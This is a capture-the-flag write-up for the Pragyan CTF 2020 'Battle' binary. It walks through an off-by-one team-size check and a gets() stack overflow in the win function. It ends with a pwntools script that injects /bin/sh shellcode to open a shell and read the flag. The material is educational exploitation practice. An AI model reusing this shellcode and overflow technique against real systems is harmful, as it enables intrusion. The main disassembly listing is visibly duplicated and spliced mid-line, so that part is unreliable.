# Pragyan CTF 2020: Battle.


> Find and submit the flag
>
> [./includes/battle](battle)

## Write-up
Given the binary,

1. If we try to run the binary as `./battle`, and experiment with the inputs, we get the output as

```bash
$ ./battle

Battlegrounds! Form your team and fight!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 0/8
A hello
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 1/8
F
You have 3 strength, but you should have 400 to be the best!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 1/8
A hello
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 2/8
F
You have 9 strength, but you should have 400 to be the best!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 2/8
A hello
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 3/8
F
You have 16 strength, but you should have 400 to be the best!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 3/8
Q
Thank you for playing!
```
It seems that we can form a team of up to 8 players, and the target strength is 400. However, team strength is being incremented in very small quantities, so it won't reach 400 normally.

2. Disassembling the binary using `objdump -D battle`, we get the disassembly of the main function as

```bash
$ objdump -D battle

08049373 <main>:
 8049373:       f3 0f 1e fb             endbr32 
 8049377:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804937b:       83 e4 f0                and    $0xfffffff0,%esp
 804937e:       ff 71 fc                pushl  -0x4(%ecx)
 8049381:       55                      push   %ebp
 8049382:       89 e5                   mov    %esp,%ebp
 8049384:       53                      push   %ebx
 8049385:       51                      push   %ecx
 8049386:       83 ec 30                sub    $0x30,%esp
 8049389:       e8 42 fe ff ff          call   80491d0 <__x86.get_pc_thunk.bx>
 804938e:       81 c3 72 2c 00 00       add    $0x2c72,%ebx
 8049394:       e8 b7 fd ff ff          call   8049150 <getgid@plt>
 8049399:       89 45 f4                mov    %eax,-0xc(%ebp)
 804939c:       83 ec 04                sub    $0x4,%esp
 804939f:       ff 75 f4                pushl  -0xc(%ebp)
 80493a2:       ff 75 f4                pushl  -0xc(%ebp)
 80493a5:       ff 75 f4                pushl  -0xc(%ebp)
 80493a8:       e8 c3 fd ff ff          call   8049170 <setresgid@plt>
 80493ad:       83 c4 10                add    $0x10,%esp
 80493b0:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
 80493b6:       8b 00                   mov    (%eax),%eax
 80493b8:       83 ec 08                sub    $0x8,%esp
 80493bb:       6a 00                   push   $0x008049373 <main>:
 8049373:       f3 0f 1e fb             endbr32 
 8049377:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804937b:       83 e4 f0                and    $0xfffffff0,%esp
 804937e:       ff 71 fc                pushl  -0x4(%ecx)
 8049381:       55                      push   %ebp
 8049382:       89 e5                   mov    %esp,%ebp
 8049384:       53                      push   %ebx
 8049385:       51                      push   %ecx
 8049386:       83 ec 30                sub    $0x30,%esp
 8049389:       e8 42 fe ff ff          call   80491d0 <__x86.get_pc_thunk.bx>
 804938e:       81 c3 72 2c 00 00       add    $0x2c72,%ebx
 8049394:       e8 b7 fd ff ff          call   8049150 <getgid@plt>
 8049399:       89 45 f4                mov    %eax,-0xc(%ebp)
 804939c:       83 ec 04                sub    $0x4,%esp
 804939f:       ff 75 f4                pushl  -0xc(%ebp)
 80493a2:       ff 75 f4                pushl  -0xc(%ebp)
 80493a5:       ff 75 f4                pushl  -0xc(%ebp)
 80493a8:       e8 c3 fd ff ff          call   8049170 <setresgid@plt>
 80493ad:       83 c4 10                add    $0x10,%esp
 80493b0:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
 80493b6:       8b 00                   mov    (%eax),%eax
 80493b8:       83 ec 08                sub    $0x8,%esp
 80493bb:       6a 00                   push   $0x0
 80493bd:       50                      push   %eax
 80493be:       e8 1d fd ff ff          call   80490e0 <setbuf@plt>
 80493c3:       83 c4 10                add    $0x10,%esp
 80493c6:       83 ec 0c                sub    $0xc,%esp
 80493c9:       8d 83 ac e0 ff ff       lea    -0x1f54(%ebx),%eax
 80493cf:       50                      push   %eax
 80493d0:       e8 5b fd ff ff          call   8049130 <puts@plt>
 80493d5:       83 c4 10                add    $0x10,%esp
 80493d8:       c7 45 ec 00 00 00 00    movl   $0x0,-0x14(%ebp)
 80493df:       83 ec 0c                sub    $0xc,%esp
 80493e2:       6a 20                   push   $0x20
 80493e4:       e8 37 fd ff ff          call   8049120 <malloc@plt>
 80493e9:       83 c4 10                add    $0x10,%esp
 80493ec:       89 45 e8                mov    %eax,-0x18(%ebp)
 80493ef:       83 ec 0c                sub    $0xc,%esp
 80493f2:       8d 83 d8 e0 ff ff       lea    -0x1f28(%ebx),%eax
 80493f8:       50                      push   %eax
 80493f9:       e8 32 fd ff ff          call   8049130 <puts@plt>
 80493fe:       83 c4 10                add    $0x10,%esp
 8049401:       8b 45 ec                mov    -0x14(%ebp),%eax
 8049404:       83 ec 04                sub    $0x4,%esp
 8049407:       6a 08                   push   $0x8
 8049409:       50                      push   %eax
 804940a:       8d 83 11 e1 ff ff       lea    -0x1eef(%ebx),%eax
 8049410:       50                      push   %eax
 8049411:       e8 da fc ff ff          call   80490f0 <printf@plt>
 8049416:       83 c4 10                add    $0x10,%esp
 8049419:       8b 83 f8 ff ff ff       mov    -0x8(%ebx),%eax
 804941f:       8b 00                   mov    (%eax),%eax
 8049421:       83 ec 04                sub    $0x4,%esp
 8049424:       50                      push   %eax
 8049425:       68 ff 00 00 00          push   $0xff
 804942a:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 8049430:       50                      push   %eax
 8049431:       e8 ca fc ff ff          call   8049100 <gets@plt>
 8049436:       83 c4 10                add    $0x10,%esp
 8049439:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 804943f:       0f b6 00                movzbl (%eax),%eax
 8049442:       3c 41                   cmp    $0x41,%al
 8049444:       0f 85 90 00 00 00       jne    80494da <main+0x167>
 804944a:       8b 45 ec                mov    -0x14(%ebp),%eax
 804944d:       83 f8 08                cmp    $0x8,%eax
 8049450:       7e 14                   jle    8049466 <main+0xf3>
 8049452:       83 ec 0c                sub    $0xc,%esp
 8049455:       8d 83 23 e1 ff ff       lea    -0x1edd(%ebx),%eax
 804945b:       50                      push   %eax
 804945c:       e8 cf fc ff ff          call   8049130 <puts@plt>
 8049461:       83 c4 10                add    $0x10,%esp
 8049464:       eb 89                   jmp    80493ef <main+0x7c>
 8049466:       e8 f5 fc ff ff          call   8049160 <rand@plt>
 804946b:       89 c1                   mov    %eax,%ecx
 804946d:       ba 67 66 66 66          mov    $0x66666667,%edx
 8049472:       89 c8                   mov    %ecx,%eax
 8049474:       f7 ea                   imul   %edx
 8049476:       c1 fa 02                sar    $0x2,%edx
 8049479:       89 c8                   mov    %ecx,%eax
 804947b:       c1 f8 1f                sar    $0x1f,%eax
 804947e:       29 c2                   sub    %eax,%edx
 8049480:       89 d0                   mov    %edx,%eax
 8049482:       c1 e0 02                shl    $0x2,%eax
 8049485:       01 d0                   add    %edx,%eax
 8049487:       01 c0                   add    %eax,%eax
 8049489:       29 c1                   sub    %eax,%ecx
 804948b:       89 ca                   mov    %ecx,%edx
 804948d:       8b 45 e8                mov    -0x18(%ebp),%eax
 8049490:       8b 4d ec                mov    -0x14(%ebp),%ecx
 8049493:       01 c8                   add    %ecx,%eax
 8049495:       88 10                   mov    %dl,(%eax)
 8049497:       83 ec 0c                sub    $0xc,%esp
 804949a:       68 00 01 00 00          push   $0x100
 804949f:       e8 7c fc ff ff          call   8049120 <malloc@plt>
 80494a4:       83 c4 10                add    $0x10,%esp
 80494a7:       89 45 f0                mov    %eax,-0x10(%ebp)
 80494aa:       83 ec 08                sub    $0x8,%esp
 80494ad:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 80494b3:       8d 40 02                lea    0x2(%eax),%eax
 80494b6:       50                      push   %eax
 80494b7:       ff 75 f0                pushl  -0x10(%ebp)
 80494ba:       e8 51 fc ff ff          call   8049110 <strcpy@plt>
 80494bf:       83 c4 10                add    $0x10,%esp
 80494c2:       8b 45 ec                mov    -0x14(%ebp),%eax
 80494c5:       8b 55 f0                mov    -0x10(%ebp),%edx
 80494c8:       89 54 85 c8             mov    %edx,-0x38(%ebp,%eax,4)
 80494cc:       8b 45 ec                mov    -0x14(%ebp),%eax
 80494cf:       83 c0 01                add    $0x1,%eax
 80494d2:       89 45 ec                mov    %eax,-0x14(%ebp)
 80494d5:       e9 15 ff ff ff          jmp    80493ef <main+0x7c>
 80494da:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 80494e0:       0f b6 00                movzbl (%eax),%eax
 80494e3:       3c 46                   cmp    $0x46,%al
 80494e5:       75 18                   jne    80494ff <main+0x18c>
 80494e7:       8b 55 ec                mov    -0x14(%ebp),%edx
 80494ea:       8b 45 e8                mov    -0x18(%ebp),%eax
 80494ed:       83 ec 08                sub    $0x8,%esp
 80494f0:       52                      push   %edx
 80494f1:       50                      push   %eax
 80494f2:       e8 f2 fd ff ff          call   80492e9 <fight>
 80494f7:       83 c4 10                add    $0x10,%esp
 80494fa:       e9 f0 fe ff ff          jmp    80493ef <main+0x7c>
 80494ff:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 8049505:       0f b6 00                movzbl (%eax),%eax
 8049508:       3c 51                   cmp    $0x51,%al
 804950a:       75 19                   jne    8049525 <main+0x1b2>
 804950c:       83 ec 0c                sub    $0xc,%esp
 804950f:       8d 83 41 e1 ff ff       lea    -0x1ebf(%ebx),%eax
 8049515:       50                      push   %eax
 8049516:       e8 d5 fb ff ff          call   80490f0 <printf@plt>
 804951b:       83 c4 10                add    $0x10,%esp
 804951e:       b8 00 00 00 00          mov    $0x0,%eax
 8049523:       eb 17                   jmp    804953c <main+0x1c9>
 8049525:       83 ec 0c                sub    $0xc,%esp
 8049528:       8d 83 58 e1 ff ff       lea    -0x1ea8(%ebx),%eax
 804952e:       50                      push   %eax
 804952f:       e8 fc fb ff ff          call   8049130 <puts@plt>
 8049534:       83 c4 10                add    $0x10,%esp
 8049537:       e9 b3 fe ff ff          jmp    80493ef <main+0x7c>
 804953c:       8d 65 f8                lea    -0x8(%ebp),%esp
 804953f:       59                      pop    %ecx
 8049540:       5b                      pop    %ebx
 8049541:       5d                      pop    %ebp
 8049542:       8d 61 fc                lea    -0x4(%ecx),%esp
 8049545:       c3                      ret  
 80493bd:       50                      push   %eax
 80493be:       e8 1d fd ff ff          call   80490e0 <setbuf@plt>
 80493c3:       83 c4 10                add    $0x10,%esp
 80493c6:       83 ec 0c                sub    $0xc,%esp
 80493c9:       8d 83 ac e0 ff ff       lea    -0x1f54(%ebx),%eax
 80493cf:       50                      push   %eax
 80493d0:       e8 5b fd ff ff          call   8049130 <puts@plt>
 80493d5:       83 c4 10                add    $0x10,%esp
 80493d8:       c7 45 ec 00 00 00 00    movl   $0x0,-0x14(%ebp)
 80493df:       83 ec 0c                sub    $0xc,%esp
 80493e2:       6a 20                   push   $0x20
 80493e4:       e8 37 fd ff ff          call   8049120 <malloc@plt>
 80493e9:       83 c4 10                add    $0x10,%esp
 80493ec:       89 45 e8                mov    %eax,-0x18(%ebp)
 80493ef:       83 ec 0c                sub    $0xc,%esp
 80493f2:       8d 83 d8 e0 ff ff       lea    -0x1f28(%ebx),%eax
 80493f8:       50                      push   %eax
 80493f9:       e8 32 fd ff ff          call   8049130 <puts@plt>
 80493fe:       83 c4 10                add    $0x10,%esp
 8049401:       8b 45 ec                mov    -0x14(%ebp),%eax
 8049404:       83 ec 04                sub    $0x4,%esp
 8049407:       6a 08                   push   $0x8
 8049409:       50                      push   %eax
 804940a:       8d 83 11 e1 ff ff       lea    -0x1eef(%ebx),%eax
 8049410:       50                      push   %eax
 8049411:       e8 da fc ff ff          call   80490f0 <printf@plt>
 8049416:       83 c4 10                add    $0x10,%esp
 8049419:       8b 83 f8 ff ff ff       mov    -0x8(%ebx),%eax
 804941f:       8b 00                   mov    (%eax),%eax
 8049421:       83 ec 04                sub    $0x4,%esp
 8049424:       50                      push   %eax
 8049425:       68 ff 00 00 00          push   $0xff
 804942a:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 8049430:       50                      push   %eax
 8049431:       e8 ca fc ff ff          call   8049100 <gets@plt>
 8049436:       83 c4 10                add    $0x10,%esp
 8049439:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 804943f:       0f b6 00                movzbl (%eax),%eax
 8049442:       3c 41                   cmp    $0x41,%al
 8049444:       0f 85 90 00 00 00       jne    80494da <main+0x167>
 804944a:       8b 45 ec                mov    -0x14(%ebp),%eax
 804944d:       83 f8 08                cmp    $0x8,%eax
 8049450:       7e 14                   jle    8049466 <main+0xf3>
 8049452:       83 ec 0c                sub    $0xc,%esp
 8049455:       8d 83 23 e1 ff ff       lea    -0x1edd(%ebx),%eax
 804945b:       50                      push   %eax
 804945c:       e8 cf fc ff ff          call   8049130 <puts@plt>
 8049461:       83 c4 10                add    $0x10,%esp
 8049464:       eb 89                   jmp    80493ef <main+0x7c>
 8049466:       e8 f5 fc ff ff          call   8049160 <rand@plt>
 804946b:       89 c1                   mov    %eax,%ecx
 804946d:       ba 67 66 66 66          mov    $0x66666667,%edx
 8049472:       89 c8                   mov    %ecx,%eax
 8049474:       f7 ea                   imul   %edx
 8049476:       c1 fa 02                sar    $0x2,%edx
 8049479:       89 c8                   mov    %ecx,%eax
 804947b:       c1 f8 1f                sar    $0x1f,%eax
 804947e:       29 c2                   sub    %eax,%edx
 8049480:       89 d0                   mov    %edx,%eax
 8049482:       c1 e0 02                shl    $0x2,%eax
 8049485:       01 d0                   add    %edx,%eax
 8049487:       01 c0                   add    %eax,%eax
 8049489:       29 c1                   sub    %eax,%ecx
 804948b:       89 ca                   mov    %ecx,%edx
 804948d:       8b 45 e8                mov    -0x18(%ebp),%eax
 8049490:       8b 4d ec                mov    -0x14(%ebp),%ecx
 8049493:       01 c8                   add    %ecx,%eax
 8049495:       88 10                   mov    %dl,(%eax)
 8049497:       83 ec 0c                sub    $0xc,%esp
 804949a:       68 00 01 00 00          push   $0x100
 804949f:       e8 7c fc ff ff          call   8049120 <malloc@plt>
 80494a4:       83 c4 10                add    $0x10,%esp
 80494a7:       89 45 f0                mov    %eax,-0x10(%ebp)
 80494aa:       83 ec 08                sub    $0x8,%esp
 80494ad:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 80494b3:       8d 40 02                lea    0x2(%eax),%eax
 80494b6:       50                      push   %eax
 80494b7:       ff 75 f0                pushl  -0x10(%ebp)
 80494ba:       e8 51 fc ff ff          call   8049110 <strcpy@plt>
 80494bf:       83 c4 10                add    $0x10,%esp
 80494c2:       8b 45 ec                mov    -0x14(%ebp),%eax
 80494c5:       8b 55 f0                mov    -0x10(%ebp),%edx
 80494c8:       89 54 85 c8             mov    %edx,-0x38(%ebp,%eax,4)
 80494cc:       8b 45 ec                mov    -0x14(%ebp),%eax
 80494cf:       83 c0 01                add    $0x1,%eax
 80494d2:       89 45 ec                mov    %eax,-0x14(%ebp)
 80494d5:       e9 15 ff ff ff          jmp    80493ef <main+0x7c>
 80494da:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 80494e0:       0f b6 00                movzbl (%eax),%eax
 80494e3:       3c 46                   cmp    $0x46,%al
 80494e5:       75 18                   jne    80494ff <main+0x18c>
 80494e7:       8b 55 ec                mov    -0x14(%ebp),%edx
 80494ea:       8b 45 e8                mov    -0x18(%ebp),%eax
 80494ed:       83 ec 08                sub    $0x8,%esp
 80494f0:       52                      push   %edx
 80494f1:       50                      push   %eax
 80494f2:       e8 f2 fd ff ff          call   80492e9 <fight>
 80494f7:       83 c4 10                add    $0x10,%esp
 80494fa:       e9 f0 fe ff ff          jmp    80493ef <main+0x7c>
 80494ff:       c7 c0 60 c0 04 08       mov    $0x804c060,%eax
 8049505:       0f b6 00                movzbl (%eax),%eax
 8049508:       3c 51                   cmp    $0x51,%al
 804950a:       75 19                   jne    8049525 <main+0x1b2>
 804950c:       83 ec 0c                sub    $0xc,%esp
 804950f:       8d 83 41 e1 ff ff       lea    -0x1ebf(%ebx),%eax
 8049515:       50                      push   %eax
 8049516:       e8 d5 fb ff ff          call   80490f0 <printf@plt>
 804951b:       83 c4 10                add    $0x10,%esp
 804951e:       b8 00 00 00 00          mov    $0x0,%eax
 8049523:       eb 17                   jmp    804953c <main+0x1c9>
 8049525:       83 ec 0c                sub    $0xc,%esp
 8049528:       8d 83 58 e1 ff ff       lea    -0x1ea8(%ebx),%eax
 804952e:       50                      push   %eax
 804952f:       e8 fc fb ff ff          call   8049130 <puts@plt>
 8049534:       83 c4 10                add    $0x10,%esp
 8049537:       e9 b3 fe ff ff          jmp    80493ef <main+0x7c>
 804953c:       8d 65 f8                lea    -0x8(%ebp),%esp
 804953f:       59                      pop    %ecx
 8049540:       5b                      pop    %ebx
 8049541:       5d                      pop    %ebp
 8049542:       8d 61 fc                lea    -0x4(%ecx),%esp
 8049545:       c3                      ret  
 ```
We can see that at instruction `804944d`, the program compares register `eax` with the value `0x8`, and jumps if the value of the register is less than or equal to the given value. However, when we run the program, it seems to be that we can only add a maximum of 8 team members, but the comparison would prove true even when the current number of members is equal to 8, thus allowing us to add one extra member.

3. Running the binary again, to try adding 9 members

```bash
$ ./battle

Battlegrounds! Form your team and fight!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 0/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 1/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 2/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 3/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 4/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 5/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 6/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 7/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 8/8
F
You have 37 strength, but you should have 400 to be the best!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 8/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 9/8
F
You have 97 strength, but you should have 400 to be the best!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 9/8
A a
Too many people in your team!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 9/8
Q
Thank you for playing!
```
We are able to add a 9th team member, which does not seem to be intended. There is also a drastic increase in team strength upon adding the 9th member, so there might be a buffer overflow in effect here. 

4. Experimenting with the name of the 9th member, we see that it varies with the input that is passed as the name. Hence, we will be able to overwrite the strengths of the previous members. We can split the required strength of 400 between each member, that is 50 each, which represents the character `2` in ASCII.

```bash
$ ./battle
Battlegrounds! Form your team and fight!
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 0/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 1/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 2/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 3/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 4/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 5/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 6/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 7/8
A a
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 8/8
A 22222222
Commands: 
A <name> - Add team member
F - Fight
Q - Quit
Team Size: 9/8
F
WOW! You have such a strong team!
Enter your team name for the leaderboard: 
```
Now we have reached the required strength of 400.

5. Upon each `F` input, it seems that the program calls a function called fight, whose disassembly is

```bash
080492e9 <fight>:
 80492e9:       f3 0f 1e fb             endbr32 
 80492ed:       55                      push   %ebp
 80492ee:       89 e5                   mov    %esp,%ebp
 80492f0:       53                      push   %ebx
 80492f1:       83 ec 14                sub    $0x14,%esp
 80492f4:       e8 4d 02 00 00          call   8049546 <__x86.get_pc_thunk.ax>
 80492f9:       05 07 2d 00 00          add    $0x2d07,%eax
 80492fe:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
 8049305:       c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
 804930c:       eb 15                   jmp    8049323 <fight+0x3a>
 804930e:       8b 4d f0                mov    -0x10(%ebp),%ecx
 8049311:       8b 55 08                mov    0x8(%ebp),%edx
 8049314:       01 ca                   add    %ecx,%edx
 8049316:       0f b6 12                movzbl (%edx),%edx
 8049319:       0f be d2                movsbl %dl,%edx
 804931c:       01 55 f4                add    %edx,-0xc(%ebp)
 804931f:       83 45 f0 01             addl   $0x1,-0x10(%ebp)
 8049323:       8b 55 f0                mov    -0x10(%ebp),%edx
 8049326:       3b 55 0c                cmp    0xc(%ebp),%edx
 8049329:       7c e3                   jl     804930e <fight+0x25>
 804932b:       ba 90 01 00 00          mov    $0x190,%edx
 8049330:       39 55 f4                cmp    %edx,-0xc(%ebp)
 8049333:       75 1b                   jne    8049350 <fight+0x67>
 8049335:       83 ec 0c                sub    $0xc,%esp
 8049338:       8d 90 48 e0 ff ff       lea    -0x1fb8(%eax),%edx
 804933e:       52                      push   %edx
 804933f:       89 c3                   mov    %eax,%ebx
 8049341:       e8 ea fd ff ff          call   8049130 <puts@plt>
 8049346:       83 c4 10                add    $0x10,%esp
 8049349:       e8 48 ff ff ff          call   8049296 <win>
 804934e:       eb 1d                   jmp    804936d <fight+0x84>
 8049350:       ba 90 01 00 00          mov    $0x190,%edx
 8049355:       83 ec 04                sub    $0x4,%esp
 8049358:       52                      push   %edx
 8049359:       ff 75 f4                pushl  -0xc(%ebp)
 804935c:       8d 90 6c e0 ff ff       lea    -0x1f94(%eax),%edx
 8049362:       52                      push   %edx
 8049363:       89 c3                   mov    %eax,%ebx
 8049365:       e8 86 fd ff ff          call   80490f0 <printf@plt>
 804936a:       83 c4 10                add    $0x10,%esp
 804936d:       90                      nop
 804936e:       8b 5d fc                mov    -0x4(%ebp),%ebx
 8049371:       c9                      leave  
 8049372:       c3                      ret  
 ```
 Upon reaching the required strength, this function calls another function called win, whose disassembly is

 ```bash
 08049296 <win>:
 8049296:       f3 0f 1e fb             endbr32 
 804929a:       55                      push   %ebp
 804929b:       89 e5                   mov    %esp,%ebp
 804929d:       53                      push   %ebx
 804929e:       83 ec 14                sub    $0x14,%esp
 80492a1:       e8 2a ff ff ff          call   80491d0 <__x86.get_pc_thunk.bx>
 80492a6:       81 c3 5a 2d 00 00       add    $0x2d5a,%ebx
 80492ac:       83 ec 0c                sub    $0xc,%esp
 80492af:       8d 83 0c e0 ff ff       lea    -0x1ff4(%ebx),%eax
 80492b5:       50                      push   %eax
 80492b6:       e8 35 fe ff ff          call   80490f0 <printf@plt>
 80492bb:       83 c4 10                add    $0x10,%esp
 80492be:       83 ec 0c                sub    $0xc,%esp
 80492c1:       8d 45 e8                lea    -0x18(%ebp),%eax
 80492c4:       50                      push   %eax
 80492c5:       e8 36 fe ff ff          call   8049100 <gets@plt>
 80492ca:       83 c4 10                add    $0x10,%esp
 80492cd:       83 ec 08                sub    $0x8,%esp
 80492d0:       8d 45 e8                lea    -0x18(%ebp),%eax
 80492d3:       50                      push   %eax
 80492d4:       8d 83 37 e0 ff ff       lea    -0x1fc9(%ebx),%eax
 80492da:       50                      push   %eax
 80492db:       e8 10 fe ff ff          call   80490f0 <printf@plt>
 80492e0:       83 c4 10                add    $0x10,%esp
 80492e3:       90                      nop
 80492e4:       8b 5d fc                mov    -0x4(%ebp),%ebx
 80492e7:       c9                      leave  
 80492e8:       c3                      ret   
 ```
 This function seems to get an input name using the gets function and prints it back as follows

 ```bash
 WOW! You have such a strong team!
Enter your team name for the leaderboard: IWon
Leaderboard:
IWon
```

6. Since the gets function is vulnerable, we can use it to overwrite the return address of the win function and make it execute some other code of our wish. We can use a location on the stack to push a shellcode to give us a command shell, and redirect the control of the program to that location.

To find the location to which we can write to, we run `gdb battle` and run the program, then view the stack at the win function after the gets function is called, and select a suitable address than can be overwritten with the shellcode.

7. Now constructing the exploit, as `exploit.py`, substituting with the required offset and stack address,
```python
#!/usr/bin/env python

from pwn import *

elf = ELF('./battle')
p = elf.process()

#Send responses for forming the team
p.send("A\n"*8 + "A 22222222\n" + "F")

#Build payload for sending shellcode to get a shell
padding = b'a'*Offset
eip = p32(int(StackAddress,16))
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
p.send(padding + eip + payload)

p.interactive()
```

8. Now we get the shell, and we can run `cat flag.txt`
```bash
$ cat flag.txt
p_ctf{I_m4d3_5ur3_m7_t34m_15_th3_b35t!}
```
which provides us with the flag.